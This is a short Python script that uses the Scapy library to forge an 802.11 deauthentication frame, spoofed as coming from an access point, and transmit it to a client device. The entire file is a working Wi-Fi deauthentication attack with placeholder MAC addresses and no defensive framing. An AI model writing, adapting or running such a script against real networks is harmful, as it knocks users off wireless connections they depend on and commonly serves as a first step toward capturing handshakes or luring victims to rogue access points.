from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def send_deauth_packet(iface, ap_mac, client_mac):
    pkt = RadioTap() / \
          Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / \
          Dot11Deauth(reason=7)
    sendp(pkt, iface=iface, count=1, verbose=1)

if __name__ == "__main__":
    interface = "en0"
    ap_mac = "00:11:22:33:44:55"
    client_mac = "66:77:88:99:aa:bb"
    send_deauth_packet(interface, ap_mac, client_mac)